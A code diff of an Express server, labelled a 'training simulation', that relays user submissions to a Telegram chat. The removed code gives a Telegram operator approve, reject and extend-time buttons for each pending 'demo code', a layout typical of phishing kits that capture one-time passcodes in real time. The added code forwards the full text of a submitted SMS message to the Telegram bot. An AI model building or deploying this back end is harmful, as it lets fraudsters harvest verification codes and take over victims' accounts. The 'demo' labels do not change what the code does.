@@ -1,314 +1,118 @@
 const express = require("express");
 const path = require("path");
-const TelegramBot = require("node-telegram-bot-api");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Telegram configuration
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-const bot = TELEGRAM_BOT_TOKEN
-  ? new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true })
-  : null;
-
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+app.use(express.static(__dirname));
 
-// Store demo requests in memory
-const requests = new Map();
 
-/*
-  Serve the frontend
-*/
-app.use(express.static(path.join(__dirname, "public")));
+// STEP 1
+// Receives the complete DEMO SMS message.
+app.post("/demo-message", async (req, res) => {
+  const { demoMessage } = req.body;
 
-app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "index.html"));
-});
-
-/*
-  Health check
-*/
-app.get("/health", (req, res) => {
-  res.json({
-    status: "ok",
-    demo: true
-  });
-});
-
-/*
-  Create a demo verification request.
-
-  IMPORTANT:
-  The entered OTP/PIN/demo code is NOT sent to Telegram.
-*/
-app.post("/api/demo-request", async (req, res) => {
-  const page = req.body?.page || "Page 1";
-
-  const requestId =
-    Date.now().toString(36) +
-    Math.random().toString(36).substring(2, 8);
-
-  const createdAt = new Date();
-
-  const time = new Intl.DateTimeFormat("en-GB", {
-    timeZone: "Africa/Nairobi",
-    year: "numeric",
-    month: "2-digit",
-    day: "2-digit",
-    hour: "2-digit",
-    minute: "2-digit",
-    second: "2-digit",
-    hour12: false
-  }).format(createdAt);
-
-  const demoRequest = {
-    id: requestId,
-    page,
-    status: "pending",
-    createdAt: createdAt.toISOString()
-  };
-
-  requests.set(requestId, demoRequest);
-
-  if (bot && TELEGRAM_CHAT_ID) {
-    try {
-      await bot.sendMessage(
-        TELEGRAM_CHAT_ID,
-        `🧪 DEMO VERIFICATION
-━━━━━━━━━━━━━━━━━━━━
-
-📄 PAGE: ${page}
-
-USER DETAILS:
-
-• Request ID: ${requestId}
-• Time: ${time}
-• Demo code entered: YES
-
-━━━━━━━━━━━━━━━━━━━━
-
-VERIFY THE DEMO:
-
-• Demo code length: 6 digits
-• Timeout: 5 minutes
-
-━━━━━━━━━━━━━━━━━━━━
-
-⏳ PENDING REVIEW`,
-        {
-          reply_markup: {
-            inline_keyboard: [
-              [
-                {
-                  text: "✅ Correct Demo",
-                  callback_data: `approve:${requestId}`
-                },
-                {
-                  text: "❌ Wrong Demo",
-                  callback_data: `reject:${requestId}`
-                }
-              ],
-              [
-                {
-                  text: "⏱ Extend Time",
-                  callback_data: `extend:${requestId}`
-                }
-              ]
-            ]
-          }
-        }
-      );
-    } catch (error) {
-      console.error("Telegram error:", error.message);
-    }
+  if (!demoMessage || typeof demoMessage !== "string") {
+    return res.status(400).send("Demo message is required");
   }
 
-  res.json({
-    success: true,
-    requestId,
-    status: "pending",
-    page
-  });
+  const telegramMessage =
+`🧪 DEMO SMS SUBMISSION
+
+${demoMessage}
+
+This was submitted from the training simulation.`;
+
+  try {
+    await sendToTelegram(telegramMessage);
+
+    res.json({
+      success: true
+    });
+
+  } catch (error) {
+    console.error(error);
+
+    res.status(500).json({
+      success: false
+    });
+  }
 });
 
-/*
-  Check the status of a demo request
-*/
-app.get("/api/demo-request/:id", (req, res) => {
-  const request = requests.get(req.params.id);
 
-  if (!request) {
-    return res.status(404).json({
-      success: false,
-      error: "Demo request not found"
+// STEP 2
+// Sends only confirmation that the demo code was entered.
+// The actual four digits are deliberately NOT transmitted.
+app.post("/demo-verification", async (req, res) => {
+
+  if (req.body.verified !== true) {
+    return res.status(400).json({
+      success: false
     });
   }
 
-  res.json({
-    success: true,
-    requestId: request.id,
-    page: request.page,
-    status: request.status
-  });
+  const telegramMessage =
+`🧪 DEMO VERIFICATION
+
+4-digit demo code entered: YES
+
+The demo code itself was not transmitted.`;
+
+  try {
+    await sendToTelegram(telegramMessage);
+
+    res.json({
+      success: true
+    });
+
+  } catch (error) {
+    console.error(error);
+
+    res.status(500).json({
+      success: false
+    });
+  }
 });
 
-/*
-  Telegram button handling
-*/
-if (bot) {
-  bot.on("callback_query", async (query) => {
-    try {
-      const data = query.data || "";
-      const [action, requestId] = data.split(":");
 
-      if (!requestId) {
-        await bot.answerCallbackQuery(query.id, {
-          text: "Invalid demo request."
-        });
-        return;
-      }
+async function sendToTelegram(message) {
 
-      const request = requests.get(requestId);
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
 
-      if (!request) {
-        await bot.answerCallbackQuery(query.id, {
-          text: "Demo request expired."
-        });
-        return;
-      }
+  if (!token || !chatId) {
+    throw new Error(
+      "TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing"
+    );
+  }
 
-      /*
-        CORRECT DEMO
-      */
-      if (action === "approve") {
-        request.status = "approved";
+  const telegramUrl =
+    `https://api.telegram.org/bot${token}/sendMessage`;
 
-        await bot.answerCallbackQuery(query.id, {
-          text: "Demo approved."
-        });
+  const response = await fetch(telegramUrl, {
+    method: "POST",
 
-        await bot.editMessageText(
-          `🧪 DEMO VERIFICATION
-━━━━━━━━━━━━━━━━━━━━
+    headers: {
+      "Content-Type": "application/json"
+    },
 
-📄 PAGE: ${request.page}
-
-Request ID:
-${requestId}
-
-Status: ✅ CORRECT DEMO
-
-The training page can continue.`,
-          {
-            chat_id: query.message.chat.id,
-            message_id: query.message.message_id
-          }
-        );
-
-        return;
-      }
-
-      /*
-        WRONG DEMO
-      */
-      if (action === "reject") {
-        request.status = "rejected";
-
-        await bot.answerCallbackQuery(query.id, {
-          text: "Demo rejected."
-        });
-
-        await bot.editMessageText(
-          `🧪 DEMO VERIFICATION
-━━━━━━━━━━━━━━━━━━━━
-
-📄 PAGE: ${request.page}
-
-Request ID:
-${requestId}
-
-Status: ❌ WRONG DEMO
-
-The training page can allow
-the user to re-enter the
-demonstration code.`,
-          {
-            chat_id: query.message.chat.id,
-            message_id: query.message.message_id
-          }
-        );
-
-        return;
-      }
-
-      /*
-        EXTEND TIME
-      */
-      if (action === "extend") {
-        request.status = "pending";
-
-        await bot.answerCallbackQuery(query.id, {
-          text: "Demo time extended."
-        });
-
-        await bot.editMessageText(
-          `🧪 DEMO VERIFICATION
-━━━━━━━━━━━━━━━━━━━━
-
-📄 PAGE: ${request.page}
-
-Request ID:
-${requestId}
-
-Status: ⏱ TIME EXTENDED
-
-The training request remains
-pending.`,
-          {
-            chat_id: query.message.chat.id,
-            message_id: query.message.message_id,
-            reply_markup: {
-              inline_keyboard: [
-                [
-                  {
-                    text: "✅ Correct Demo",
-                    callback_data: `approve:${requestId}`
-                  },
-                  {
-                    text: "❌ Wrong Demo",
-                    callback_data: `reject:${requestId}`
-                  }
-                ],
-                [
-                  {
-                    text: "⏱ Extend Time",
-                    callback_data: `extend:${requestId}`
-                  }
-                ]
-              ]
-            }
-          }
-        );
-
-        return;
-      }
-
-      await bot.answerCallbackQuery(query.id, {
-        text: "Unknown action."
-      });
-
-    } catch (error) {
-      console.error("Telegram callback error:", error.message);
-    }
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
   });
+
+  if (!response.ok) {
+    const errorText = await response.text();
+    throw new Error(
+      `Telegram error: ${errorText}`
+    );
+  }
 }
 
-/*
-  Start server
-*/
+
 app.listen(PORT, () => {
   console.log(`Demo server running on port ${PORT}`);
 });
